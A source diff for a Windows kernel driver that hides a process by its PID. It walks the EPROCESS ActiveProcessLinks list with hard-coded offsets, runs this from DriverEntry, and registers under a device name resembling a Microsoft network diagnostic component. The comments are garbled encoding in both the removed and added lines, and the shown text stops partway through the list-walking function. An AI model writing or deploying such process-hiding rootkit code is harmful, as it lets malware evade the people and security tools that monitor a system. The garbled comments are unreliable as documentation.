@@ -1,25 +1,31 @@
+/********************************************
+description
+
+
+
+********************************************/
 #include <ntddk.h>
 #include "datatype.h"
 #include "dbgmsg.h"
 #include "ctrlcode.h"
 #include "device.h"
-// Ê¹ÓÃ build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  ÃüÁî±àÒë¸ÃÇı¶¯Ô´ÎÄ¼ş
+// ä½¿ç”¨ build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  å‘½ä»¤ç¼–è¯‘è¯¥é©±åŠ¨æºæ–‡ä»¶
 //#define MEM_TAG  "UseForCopyFile"
-// ×¢Òâ£º´ËÇı¶¯Í¨¹ısc.exe¼ÓÔØÖÁÄÚºË¿Õ¼äÊ±£¬»áÊ¹ÓÃ×ÔÉíÊµÏÖµÄÍ¬²½»úÖÆÀ´·ÃÎÊÈ«¾ÖµÄ»î¶¯½ø³ÌÁ´±í£¬È»ºóÒş²Ø
-//Ö¸¶¨pidµÄ½ø³Ì£¬µ«´ËÇı¶¯Ğ¶ÔØÊ±²¢²»»á»¹Ô­¶ÔÁ´±íµÄĞŞ¸Ä£¬Òò´Ë²»»áÖØÏÖÄ¿±ê½ø³Ì¡£ĞèÒª±àĞ´ÁíÍâµÄÂß¼­ÔÚ
-// Çı¶¯Ğ¶ÔØÊ±ÖØÏÖÒş²ØµÄ½ø³Ì£¨»òÕßÖØÆôÏµÍ³Ò²¿ÉÒÔ£©
-//ĞèÒªÔÚ¶àºËÏµÍ³ÉÏ²âÊÔ´ËÇı¶¯µÄ»¥³â·ÃÎÊÂß¼­ÊÇ·ñÄÜ¹»Õı³£ÔË×÷£¬·´Ö®Ôò»áµ¼ÖÂbugcheckÀ¶ÆÁ
+// æ³¨æ„ï¼šæ­¤é©±åŠ¨é€šè¿‡sc.exeåŠ è½½è‡³å†…æ ¸ç©ºé—´æ—¶ï¼Œä¼šä½¿ç”¨è‡ªèº«å®ç°çš„åŒæ­¥æœºåˆ¶æ¥è®¿é—®å…¨å±€çš„æ´»åŠ¨è¿›ç¨‹é“¾è¡¨ï¼Œç„¶åéšè—
+//æŒ‡å®špidçš„è¿›ç¨‹ï¼Œä½†æ­¤é©±åŠ¨å¸è½½æ—¶å¹¶ä¸ä¼šè¿˜åŸå¯¹é“¾è¡¨çš„ä¿®æ”¹ï¼Œå› æ­¤ä¸ä¼šé‡ç°ç›®æ ‡è¿›ç¨‹ã€‚éœ€è¦ç¼–å†™å¦å¤–çš„é€»è¾‘åœ¨
+// é©±åŠ¨å¸è½½æ—¶é‡ç°éšè—çš„è¿›ç¨‹ï¼ˆæˆ–è€…é‡å¯ç³»ç»Ÿä¹Ÿå¯ä»¥ï¼‰
+//éœ€è¦åœ¨å¤šæ ¸ç³»ç»Ÿä¸Šæµ‹è¯•æ­¤é©±åŠ¨çš„äº’æ–¥è®¿é—®é€»è¾‘æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸è¿ä½œï¼Œåä¹‹åˆ™ä¼šå¯¼è‡´bugcheckè“å±
 
-#define EPROCESS_OFFSET_PID				0xb4		//¼´ EPROCESS.UniqueProcessId £¬Æ«ÒÆÁ¿Îª 0xb4 ×Ö½Ú
-#define EPROCESS_OFFSET_NAME				0x16c		//¼´ EPROCESS.ImageFileName £¬Æ«ÒÆÁ¿Îª 0x16c ×Ö½Ú
-#define EPROCESS_OFFSET_LINKS				0xb8			//¼´ EPROCESS.ActiveProcessLinks £¬Æ«ÒÆÁ¿Îª 0xb8 ×Ö½Ú
-#define SZ_EPROCESS_NAME					0x010	// Ô­Ê¼ÎÄµµ¶¨ÒåÖĞ£¬½ø³ÌÃû³Æ´æ´¢ÔÚ³¤¶ÈÎª15¸ö×Ö½Ú×Ö·ûÊı×éÖĞ£¬
-											// ÕâÀï°Ñ³¤¶È¸ÃÎª16ÊÇÎªÁË°Ñ×îºóÒ»¸öÔªËØ¸³ÖµÎª\0½áÎ²±êÖ¾
+#define EPROCESS_OFFSET_PID				0xb4		//å³ EPROCESS.UniqueProcessId ï¼Œåç§»é‡ä¸º 0xb4 å­—èŠ‚
+#define EPROCESS_OFFSET_NAME				0x16c		//å³ EPROCESS.ImageFileName ï¼Œåç§»é‡ä¸º 0x16c å­—èŠ‚
+#define EPROCESS_OFFSET_LINKS				0xb8			//å³ EPROCESS.ActiveProcessLinks ï¼Œåç§»é‡ä¸º 0xb8 å­—èŠ‚
+#define SZ_EPROCESS_NAME					0x010	// åŸå§‹æ–‡æ¡£å®šä¹‰ä¸­ï¼Œè¿›ç¨‹åç§°å­˜å‚¨åœ¨é•¿åº¦ä¸º15ä¸ªå­—èŠ‚å­—ç¬¦æ•°ç»„ä¸­ï¼Œ
+											// è¿™é‡ŒæŠŠé•¿åº¦è¯¥ä¸º16æ˜¯ä¸ºäº†æŠŠæœ€åä¸€ä¸ªå…ƒç´ èµ‹å€¼ä¸º\0ç»“å°¾æ ‡å¿—
 
 
-/* MSNetDigaDeviceObject´ú±íÎÒÃÇ´´½¨µÄÉè±¸ */
+/* MSNetDigaDeviceObjectä»£è¡¨æˆ‘ä»¬åˆ›å»ºçš„è®¾å¤‡ */
 PDEVICE_OBJECT MSNetDiagDeviceObject;
-/* DriverObjectRef´ú±íÎÒÃÇ×¢²áµÄÇı¶¯ */
+/* DriverObjectRefä»£è¡¨æˆ‘ä»¬æ³¨å†Œçš„é©±åŠ¨ */
 PDRIVER_OBJECT DriverObjectRef;
 KIRQL  RaiseIRQL();
 PKDPC  AcquireLock();
@@ -48,23 +54,23 @@ NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
 
 NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject);
 NTSTATUS RegisterDriverDeviceLink();
-//Õâ¶ş¸ö×÷ÎªÈ«¾Ö±äÁ¿£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë£¨±¨´í£º¾Ö²¿±äÁ¿Î´³õÊ¼»¯£©
+//è¿™äºŒä¸ªä½œä¸ºå…¨å±€å˜é‡ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ï¼ˆæŠ¥é”™ï¼šå±€éƒ¨å˜é‡æœªåˆå§‹åŒ–ï¼‰
 
 KIRQL  old_irql;
 KSPIN_LOCK  get_spin_lock;
 
 
-// ÏÂÃæµÄ3¸öÈ«¾Ö±äÁ¿ÓÃÓÚÔÚ¶à´¦ÀíÆ÷ÏµÍ³ÉÏÍ¬²½¶ÔOS×ÊÔ´µÄ·ÃÎÊ
+// ä¸‹é¢çš„3ä¸ªå…¨å±€å˜é‡ç”¨äºåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸ŠåŒæ­¥å¯¹OSèµ„æºçš„è®¿é—®
  
-PKDPC  dpcPointer;		//Ò»¸öÖ¸Õë£¬Ö¸ÏòÓÉ DPC£¨ÑÓ³Ù¹ı³Ìµ÷ÓÃ£©¶ÔÏó¹¹³ÉµÄÊı×é£»Ã¿´¦ÀíÆ÷/ºË±»·ÖÅäÒ»¸ö´ËÀàÊı×é£»Ã¿´¦ÀíÆ÷ÉÏµÄ DPC
-					// Àı³ÌÔËĞĞÔÚ DISPATCH_LEVEL ¼¶£¬Òò´Ë¿ÉÒÔ¹ÒÆğ¸Ã´¦ÀíÆ÷/ºËÉÏÔËĞĞµÄ OSµÄÏß³Ìµ÷¶È´úÂëÊµÏÖÍ¬²½¡£
-DWORD has_finished_access_os_res;		//µ±Íê³É¶ÔOS×ÊÔ´µÄÍ¬²½·ÃÎÊÊ±£¬Ó¦½«´Ë±êÖ¾ÖÃ1
-DWORD nCPUsLocked;		//±êÊ¶µ±Ç°±»Í¬²½ÁËµÄ£¨ÔËĞĞÔÚ DISPATCH_LEVEL£©CPU/ºËÊıÁ¿£¬´Ë±äÁ¿Ó¦¸ÃÍ¨¹ı InterLocked*() ÏµÁĞÀı³ÌÔ­×ÓµØ½øĞĞ¶ÁĞ´
-// ÉùÃ÷Ò»¸öÎ»ÓÚÍâ²¿»ã±àÔ´ÎÄ¼ş£¨.../amd64/lib.asm£©ÖĞµÄº¯Êı£¬Ëü½ö½öÖ´ĞĞ nop ¿ÕÖ¸Áî
+PKDPC  dpcPointer;		//ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç”± DPCï¼ˆå»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨ï¼‰å¯¹è±¡æ„æˆçš„æ•°ç»„ï¼›æ¯å¤„ç†å™¨/æ ¸è¢«åˆ†é…ä¸€ä¸ªæ­¤ç±»æ•°ç»„ï¼›æ¯å¤„ç†å™¨ä¸Šçš„ DPC
+					// ä¾‹ç¨‹è¿è¡Œåœ¨ DISPATCH_LEVEL çº§ï¼Œå› æ­¤å¯ä»¥æŒ‚èµ·è¯¥å¤„ç†å™¨/æ ¸ä¸Šè¿è¡Œçš„ OSçš„çº¿ç¨‹è°ƒåº¦ä»£ç å®ç°åŒæ­¥ã€‚
+DWORD has_finished_access_os_res;		//å½“å®Œæˆå¯¹OSèµ„æºçš„åŒæ­¥è®¿é—®æ—¶ï¼Œåº”å°†æ­¤æ ‡å¿—ç½®1
+DWORD nCPUsLocked;		//æ ‡è¯†å½“å‰è¢«åŒæ­¥äº†çš„ï¼ˆè¿è¡Œåœ¨ DISPATCH_LEVELï¼‰CPU/æ ¸æ•°é‡ï¼Œæ­¤å˜é‡åº”è¯¥é€šè¿‡ InterLocked*() ç³»åˆ—ä¾‹ç¨‹åŸå­åœ°è¿›è¡Œè¯»å†™
+// å£°æ˜ä¸€ä¸ªä½äºå¤–éƒ¨æ±‡ç¼–æºæ–‡ä»¶ï¼ˆ.../amd64/lib.asmï¼‰ä¸­çš„å‡½æ•°ï¼Œå®ƒä»…ä»…æ‰§è¡Œ nop ç©ºæŒ‡ä»¤
 
-// ¸ÃÎÄ¼şÄÚÈİÈçÏÂ£º
-// ¸ÃÎÄ¼ş½öÓÃÓÚÎª AMD64 ÌåÏµ½á¹¹£¨Ö¸¶¨ÁË /amd64 ¹¹½¨Ñ¡ÏîÊ±ÓÃ£©£¬¶ÔÓÚÄ¬ÈÏµÄ x86/i386 ¹¹½¨Ñ¡Ïî£¬ÎŞĞèÉùÃ÷¸ÃÍâ²¿º¯Êı£¬
-// ¶øÊÇÓÃÄÚÁª»ã±àÓï¾ä __asm{nop;}
+// è¯¥æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š
+// è¯¥æ–‡ä»¶ä»…ç”¨äºä¸º AMD64 ä½“ç³»ç»“æ„ï¼ˆæŒ‡å®šäº† /amd64 æ„å»ºé€‰é¡¹æ—¶ç”¨ï¼‰ï¼Œå¯¹äºé»˜è®¤çš„ x86/i386 æ„å»ºé€‰é¡¹ï¼Œæ— éœ€å£°æ˜è¯¥å¤–éƒ¨å‡½æ•°ï¼Œ
+// è€Œæ˜¯ç”¨å†…è”æ±‡ç¼–è¯­å¥ __asm{nop;}
 /*
 .CODE
 public NOP_FUNC
@@ -95,15 +101,15 @@ VOID Unload(IN PDRIVER_OBJECT DriverObject)
 
 
 /* 
- * DriverObjectÏàµ±ÓÚ×¢²áµÄÇı¶¯£¬DeviceObjectÎª¶ÔÓ¦Ä³¸öÇı¶¯Éè±¸
- * Ò»¸öÇı¶¯¿ÉÒÔ´´½¨¶à¸öÉè±¸£¬È»ºóÍ¨¹ıDriverObject::DeviceObjectºÍ
- * DeviceObject::NextDevice±éÀúÕû¸öÉè±¸Á´±í
+ * DriverObjectç›¸å½“äºæ³¨å†Œçš„é©±åŠ¨ï¼ŒDeviceObjectä¸ºå¯¹åº”æŸä¸ªé©±åŠ¨è®¾å¤‡
+ * ä¸€ä¸ªé©±åŠ¨å¯ä»¥åˆ›å»ºå¤šä¸ªè®¾å¤‡ï¼Œç„¶åé€šè¿‡DriverObject::DeviceObjectå’Œ
+ * DeviceObject::NextDeviceéå†æ•´ä¸ªè®¾å¤‡é“¾è¡¨
  */
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 {
-	//ÒòÎª DriverEntry() ÔËĞĞÔÚ PASSIVE_LEVEL ÖĞ¶Ï¼¶£¬ËùÓĞÖ»ÄÜÔÚ PASSIVE_LEVEL µ÷ÓÃµÄÄÚºËÀı³Ì¶¼Ó¦¸Ã·ÅÔÚ DriverEntry()
-	//ÄÚ²¿µ÷ÓÃ£¬°üÀ¨Ê¹ÓÃ DbgPrint() ´òÓ¡ unicode ×Ö·û´®Ê±
-	//  WDK ÖĞ¶¨ÒåµÄ²¿·ÖÊı¾İÀàĞÍÓë´«Í³ C ±ê×¼µÄÊı¾İÀàĞÍ¶ÔÓ¦¹ØÏµÈçÏÂ£º
+	//å› ä¸º DriverEntry() è¿è¡Œåœ¨ PASSIVE_LEVEL ä¸­æ–­çº§ï¼Œæ‰€æœ‰åªèƒ½åœ¨ PASSIVE_LEVEL è°ƒç”¨çš„å†…æ ¸ä¾‹ç¨‹éƒ½åº”è¯¥æ”¾åœ¨ DriverEntry()
+	//å†…éƒ¨è°ƒç”¨ï¼ŒåŒ…æ‹¬ä½¿ç”¨ DbgPrint() æ‰“å° unicode å­—ç¬¦ä¸²æ—¶
+	//  WDK ä¸­å®šä¹‰çš„éƒ¨åˆ†æ•°æ®ç±»å‹ä¸ä¼ ç»Ÿ C æ ‡å‡†çš„æ•°æ®ç±»å‹å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š
 	// ULONG -> unsigned long
 	// UCHAR -> unsigned char
 	// UINT -> unsigned int
@@ -119,11 +125,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 	
 
 	LARGE_INTEGER clock_interval_count_since_booted;
-									//ËùÓĞµÄÄÚ²¿±äÁ¿¶¼±ØĞëÊ×ÏÈ¶¨Òå
-	int i;						//Õâ¸ö±ØĞë·ÅÔÚ×îÇ°Ãæ£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë
+									//æ‰€æœ‰çš„å†…éƒ¨å˜é‡éƒ½å¿…é¡»é¦–å…ˆå®šä¹‰
+	int i;						//è¿™ä¸ªå¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘
 	ULONG  millsecond_count_per_clock;
 	ULONG  l00nanosecond_count_per_clock;
-	NTSTATUS  ntStatus;	//Õâ¸ö±ØĞë·ÅÔÚ×îÇ°Ãæ£¬·ñÔòÎŞ·¨Í¨¹ı±àÒë
+	NTSTATUS  ntStatus;	//è¿™ä¸ªå¿…é¡»æ”¾åœ¨æœ€å‰é¢ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘
 	ULONG  data_length;
 	HANDLE  my_key_handle = NULL;
 	NTSTATUS  returnedStatus;
@@ -176,7 +182,7 @@ acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(
 	} else { 
 		DBG_TRACE("Driver Entry", ".................query registry key value failed......................"); 
 	}
-	//×¢Òâ£¬DbgPrint Àı³Ì²»Ö§³ÖÈÎºÎ¸¡µãÀàĞÍ£¨%f¡¢%e¡¢%E¡¢%g¡¢%G¡¢%a »ò %A£©£¬Òò´Ë´òÓ¡¸¡µãÊı»áÔì³ÉÏµÍ³±ÀÀ£
+	//æ³¨æ„ï¼ŒDbgPrint ä¾‹ç¨‹ä¸æ”¯æŒä»»ä½•æµ®ç‚¹ç±»å‹ï¼ˆ%fã€%eã€%Eã€%gã€%Gã€%a æˆ– %Aï¼‰ï¼Œå› æ­¤æ‰“å°æµ®ç‚¹æ•°ä¼šé€ æˆç³»ç»Ÿå´©æºƒ
 	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
 	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
 	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);
@@ -185,7 +191,7 @@ acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(
 	KeQueryTickCount(&clock_interval_count_since_booted);
 	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................",  clock_interval_count_since_booted.LowPart);
 	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................",  clock_interval_count_since_booted.HighPart);
-	//ÏµÍ³ÖĞ¶Ï´ÎÊı³ËÒÔÃ¿ÖĞ¶ÏµÄºÁÃëÊı¾ÍµÃµ½Æô¶¯ÒÔÀ´¾­ÀúµÄºÁÃëÊı
+	//ç³»ç»Ÿä¸­æ–­æ¬¡æ•°ä¹˜ä»¥æ¯ä¸­æ–­çš„æ¯«ç§’æ•°å°±å¾—åˆ°å¯åŠ¨ä»¥æ¥ç»å†çš„æ¯«ç§’æ•°
 	
 	HideProcess(&proc_pid);
 	//HideProcessWithName(target_hide_process_name);
@@ -216,7 +222,7 @@ acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(
 	return STATUS_SUCCESS;
 }
 /*
- * IRP.IoStatus : ÀàĞÍÎªIO_STATUS_BLOCK
+ * IRP.IoStatus : ç±»å‹ä¸ºIO_STATUS_BLOCK
  * A driver sets an IRP's I/O status block to indicate the final status of 
  * an I/O request, before calling IoCompleteRequest for the IRP.
  typedef struct _IO_STATUS_BLOCK {
@@ -252,15 +258,15 @@ NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
 	return (STATUS_SUCCESS);
 }
 /*
- * I/O¶ÑÕ»µ¥ÔªÓÉIO_STACK_LOCATION¶¨Òå£¬Ã¿Ò»¸ö¶ÑÕ»µ¥Ôª¶¼¶ÔÓ¦Ò»¸öÉè±¸¶ÔÏó¡£
- * ÎÒÃÇÖªµÀ£¬ÔÚÒ»¸öÇı¶¯³ÌĞòÖĞ£¬¿ÉÒÔ´´½¨Ò»¸ö»ò¶à¸öÉè±¸¶ÔÏó£¬¶øÕâĞ©Éè±¸¶ÔÏó
- * ¶¼¶ÔÓ¦×ÅÒ»¸öIO_STACK_LOCATION½á¹¹Ìå£¬¶øÔÚÇı¶¯³ÌĞòÖĞµÄ¶à¸öÉè±¸¶ÔÏó£¬¶ø
- * ÕâĞ©Éè±¸¶ÔÏóÖ®¼äµÄ¹ØÏµÎªË®Æ½²ã´Î¹ØÏµ¡£
- * Parameters ÎªÃ¿¸öÀàĞÍµÄ request Ìá¹©²ÎÊı£¬ÀıÈç£ºCreate(IRP_MJ_CREATE ÇëÇó£©£¬
- * Read£¨IRP_MJ_READ ÇëÇó£©£¬StartDevice£¨IRP_MJ_PNP µÄ×ÓÀà IRP_MN_START_DEVICE£©
+ * I/Oå †æ ˆå•å…ƒç”±IO_STACK_LOCATIONå®šä¹‰ï¼Œæ¯ä¸€ä¸ªå †æ ˆå•å…ƒéƒ½å¯¹åº”ä¸€ä¸ªè®¾å¤‡å¯¹è±¡ã€‚
+ * æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ä¸€ä¸ªé©±åŠ¨ç¨‹åºä¸­ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªè®¾å¤‡å¯¹è±¡ï¼Œè€Œè¿™äº›è®¾å¤‡å¯¹è±¡
+ * éƒ½å¯¹åº”ç€ä¸€ä¸ªIO_STACK_LOCATIONç»“æ„ä½“ï¼Œè€Œåœ¨é©±åŠ¨ç¨‹åºä¸­çš„å¤šä¸ªè®¾å¤‡å¯¹è±¡ï¼Œè€Œ
+ * è¿™äº›è®¾å¤‡å¯¹è±¡ä¹‹é—´çš„å…³ç³»ä¸ºæ°´å¹³å±‚æ¬¡å…³ç³»ã€‚
+ * Parameters ä¸ºæ¯ä¸ªç±»å‹çš„ request æä¾›å‚æ•°ï¼Œä¾‹å¦‚ï¼šCreate(IRP_MJ_CREATE è¯·æ±‚ï¼‰ï¼Œ
+ * Readï¼ˆIRP_MJ_READ è¯·æ±‚ï¼‰ï¼ŒStartDeviceï¼ˆIRP_MJ_PNP çš„å­ç±» IRP_MN_START_DEVICEï¼‰
  * 
 	//
-	// NtDeviceIoControlFile ²ÎÊı
+	// NtDeviceIoControlFile å‚æ•°
 	//
 	struct
 	{
@@ -269,9 +275,9 @@ NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
 		ULONG POINTER_ALIGNMENT IoControlCode;
 		PVOID Type3InputBuffer;
 	} DeviceIoControl;
-	ÔÚDriverEntryº¯ÊıÖĞ£¬ÎÒÃÇÉèÖÃdispatchIOControl´¦ÀíIRP_MJ_DEVICE_CONTROL
-	ÀàĞÍµÄÇëÇó£¬Òò´ËÔÚdispatchIOControlÖĞ£¬ÎÒÃÇÖ»¹ØĞÄIOCTLÇëÇó£¬ParametersÖĞ
-	Ö»°üº¬DeviceIoControl³ÉÔ±
+	åœ¨DriverEntryå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬è®¾ç½®dispatchIOControlå¤„ç†IRP_MJ_DEVICE_CONTROL
+	ç±»å‹çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨dispatchIOControlä¸­ï¼Œæˆ‘ä»¬åªå…³å¿ƒIOCTLè¯·æ±‚ï¼ŒParametersä¸­
+	åªåŒ…å«DeviceIoControlæˆå‘˜
  */
 
 
@@ -311,7 +317,7 @@ NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
 		}
 		break;
 	}
-	/* ÔÚ´¦ÀíÍêÇëÇóºó£¬µ÷ÓÃIoCompleteRequest */
+	/* åœ¨å¤„ç†å®Œè¯·æ±‚åï¼Œè°ƒç”¨IoCompleteRequest */
 	IoCompleteRequest(IRP, IO_NO_INCREMENT);
 	return(ntStatus);
 }
@@ -371,10 +377,10 @@ BYTE*  getPreviousEPROCESSpointer(BYTE*  currentEPROCESSpointer)
 void  getProcessName(char  *dest,  char  *src)
 {
 	//		BYTE					BYTE*
-	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) ½ø³ÌÓ³ÏñÃû£¬¸´ÖÆ³¤¶ÈÎª16×Ö½Ú 
+	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) è¿›ç¨‹æ˜ åƒåï¼Œå¤åˆ¶é•¿åº¦ä¸º16å­—èŠ‚ 
 	strncpy(dest, src, SZ_EPROCESS_NAME);
 
-	// ×îºóÒ»¸öÔªËØ£¨16-1=15£©Îª±íÊ¾×Ö·û´®½áÎ²µÄ\0 ×Ö·û
+	// æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆ16-1=15ï¼‰ä¸ºè¡¨ç¤ºå­—ç¬¦ä¸²ç»“å°¾çš„\0 å­—ç¬¦
 	dest[SZ_EPROCESS_NAME - 1] = '\0';
 
 	return;
@@ -392,19 +398,19 @@ int  getPID(BYTE*  currentEPROCESSpointer)
 
 
 void  HideProcess(DWORD*  pid){
-	//Ê×ÏÈÍ¬²½¶ÔÓÉ EPROCESS ½á¹¹×é³ÉµÄË«ÏòÁ´±íµÄ·ÃÎÊ£¬Êµ¼ÊµÄ·ÃÎÊÊÇÔÚ WalkProcessList() º¯ÊıÖĞ½øĞĞµÄ£¬ÎªÁËÈ·±£ WalkProcessList()
-	//ÔÚ±éÀúÁ´±íÖĞµÄ½ÚµãÊ±£¬Í¬Ò»Ê±¼ä²»»áÓĞÆäËüÏß³ÌÒ²¶Ô¸ÃÁ´±íÖ´ĞĞ²åÈë»òÉ¾³ı²Ù×÷£¬ÕâÀïÊ¹ÓÃ×ÔĞıËøÀ´Í¬²½¡£
-	//ÁíÍâ£¬¼ÓËø²Ù×÷»á°Ñ IRQL ÌáÉıµ½ DISPATCH_LEVEL £¬µ¼ÖÂÈ±Ò³Òì³£´¦Àíº¯ÊıÎŞ·¨Ö´ĞĞÒ³Ãæ»»Èë²Ù×÷£¬Òò´Ë³ÌĞòÔ±ÒªÈ·±£Ï£Íû·ÃÎÊµÄ
-	//ÄÚºËÄÚ´æÓ³Éäµ½µÄÎïÀíÒ³Ãæ²»»á±»»»³öµ½´ÅÅÌÉÏ¡££¨EPROCESS ½á¹¹ÔÚ·Ç»»Ò³³ØÖĞ·ÖÅä£¬Òò´ËÃ»ÓĞÕâ¸öÎÊÌâ£©
-	//KeAcquireSpinLock-KeReleaseSpinLock »á×Ô¶¯ÌáÉıºÍ»Ö¸´ IRQL Òò´ËÃ»ÓĞ±ØÒª½øĞĞ¶àÓàµÄ KeRaiseIrql-KeLowerIrql ²Ù×÷
+	//é¦–å…ˆåŒæ­¥å¯¹ç”± EPROCESS ç»“æ„ç»„æˆçš„åŒå‘é“¾è¡¨çš„è®¿é—®ï¼Œå®é™…çš„è®¿é—®æ˜¯åœ¨ WalkProcessList() å‡½æ•°ä¸­è¿›è¡Œçš„ï¼Œä¸ºäº†ç¡®ä¿ WalkProcessList()
+	//åœ¨éå†é“¾è¡¨ä¸­çš„èŠ‚ç‚¹æ—¶ï¼ŒåŒä¸€æ—¶é—´ä¸ä¼šæœ‰å…¶å®ƒçº¿ç¨‹ä¹Ÿå¯¹è¯¥é“¾è¡¨æ‰§è¡Œæ’å…¥æˆ–åˆ é™¤æ“ä½œï¼Œè¿™é‡Œä½¿ç”¨è‡ªæ—‹é”æ¥åŒæ­¥ã€‚
+	//å¦å¤–ï¼ŒåŠ é”æ“ä½œä¼šæŠŠ IRQL æå‡åˆ° DISPATCH_LEVEL ï¼Œå¯¼è‡´ç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°æ— æ³•æ‰§è¡Œé¡µé¢æ¢å…¥æ“ä½œï¼Œå› æ­¤ç¨‹åºå‘˜è¦ç¡®ä¿å¸Œæœ›è®¿é—®çš„
+	//å†…æ ¸å†…å­˜æ˜ å°„åˆ°çš„ç‰©ç†é¡µé¢ä¸ä¼šè¢«æ¢å‡ºåˆ°ç£ç›˜ä¸Šã€‚ï¼ˆEPROCESS ç»“æ„åœ¨éæ¢é¡µæ± ä¸­åˆ†é…ï¼Œå› æ­¤æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼‰
+	//KeAcquireSpinLock-KeReleaseSpinLock ä¼šè‡ªåŠ¨æå‡å’Œæ¢å¤ IRQL å› æ­¤æ²¡æœ‰å¿…è¦è¿›è¡Œå¤šä½™çš„ KeRaiseIrql-KeLowerIrql æ“ä½œ
 	
 	/*KeInitializeSpinLock(&get_spin_lock);
 	KeAcquireSpinLock(&get_spin_lock, &old_irql);
 	WalkProcessList(*pid);
 	KeReleaseSpinLock(&get_spin_lock, old_irql);*/
 	
-	// ÉÏÃæÊ¹ÓÃ×ÔĞıËøÏµÁĞµÄº¯ÊıÔÚµ¥´¦ÀíÆ÷/ºËÉÏ£¬»òÕßĞéÄâ»úÉÏ£¬¿ÉÒÔ³É¹¦Í¬²½¶ÔOS×ÊÔ´µÄ·ÃÎÊ£»
-	//¶øÔÚ¶à´¦ÀíÆ÷/ºËÏµÍ³ÉÏ£¬ĞèÒªÊ¹ÓÃÁíÍâµÄ»úÖÆÀ´Í¬²½¶ÔOS×ÊÔ´µÄ·ÃÎÊ¡ª¡ª½«°üº¬ WalkProcessList() µ÷ÓÃÇ°ºóµÄ´úÂëÌæ»»³ÉÈçÏÂ£º
+	// ä¸Šé¢ä½¿ç”¨è‡ªæ—‹é”ç³»åˆ—çš„å‡½æ•°åœ¨å•å¤„ç†å™¨/æ ¸ä¸Šï¼Œæˆ–è€…è™šæ‹Ÿæœºä¸Šï¼Œå¯ä»¥æˆåŠŸåŒæ­¥å¯¹OSèµ„æºçš„è®¿é—®ï¼›
+	//è€Œåœ¨å¤šå¤„ç†å™¨/æ ¸ç³»ç»Ÿä¸Šï¼Œéœ€è¦ä½¿ç”¨å¦å¤–çš„æœºåˆ¶æ¥åŒæ­¥å¯¹OSèµ„æºçš„è®¿é—®â€”â€”å°†åŒ…å« WalkProcessList() è°ƒç”¨å‰åçš„ä»£ç æ›¿æ¢æˆå¦‚ä¸‹ï¼š
    
 	old_irql = RaiseIRQL();
 	dpcPointer = AcquireLock();
@@ -426,7 +432,7 @@ void  WalkProcessList(DWORD  pid)
 	int  currentPID = 0;
 	int  targetPID = 0;
 
-	//´Ë¾Ö²¿Êı×é³¤¶ÈÎª15×Ö½Ú£¨ÏÂ±ê´Ó0µ½15£©
+	//æ­¤å±€éƒ¨æ•°ç»„é•¿åº¦ä¸º15å­—èŠ‚ï¼ˆä¸‹æ ‡ä»0åˆ°15ï¼‰
 	BYTE  processName[SZ_EPROCESS_NAME];
 
 	int  fuse = 0;
@@ -456,7 +462,7 @@ void  WalkProcessList(DWORD  pid)
 
 	currentPID = getPID(currentEPROCESSpointer);
 
-	//°Ñ½ø³ÌÓ³ÏñÃû³Æ¸´ÖÆµ½±¾µØÊı×éprocessNameÄÚ£¬Éè¶¨×îºóÒ»¸ö×Ö·ûÎª\0
+	//æŠŠè¿›ç¨‹æ˜ åƒåç§°å¤åˆ¶åˆ°æœ¬åœ°æ•°ç»„processNameå†…ï¼Œè®¾å®šæœ€åä¸€ä¸ªå­—ç¬¦ä¸º\0
 	getProcessName(processName, (currentEPROCESSpointer + EPROCESS_OFFSET_NAME));
 	targetPID = currentPID;
 
@@ -474,10 +480,10 @@ void  WalkProcessList(DWORD  pid)
 	getProcessName(processName,  currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
 
 
-	// while Ñ­»·ÍË³öµÄÌõ¼şÊÇ£ºtargetPID == currentPID£¬ÒòÎªÇ°ÃæµÄ´úÂëÂß¼­½« targetPID ³õÊ¼»¯Îªµ±Ç°Ö´ĞĞ½ø³ÌµÄ PID£¬
